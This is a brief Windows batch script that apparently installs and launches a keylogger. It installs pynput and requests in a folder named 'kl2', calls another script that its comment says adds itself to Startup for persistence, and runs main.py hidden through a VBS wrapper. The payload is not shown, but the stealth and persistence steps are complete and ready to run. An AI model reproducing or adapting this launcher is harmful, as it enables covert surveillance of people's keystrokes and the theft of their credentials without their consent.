@echo off
echo Installing required packages...

cd C:\users\%USERNAME%\kl2

pip install requests
pip install pynput

:: Run autostart.bat to add run.bat to Startup
call autostart.bat

echo Running main.py...
wscript run_invisible.vbs
if %errorlevel% neq 0 (
    echo Error occurred while running main.py.
    pause
)

exit
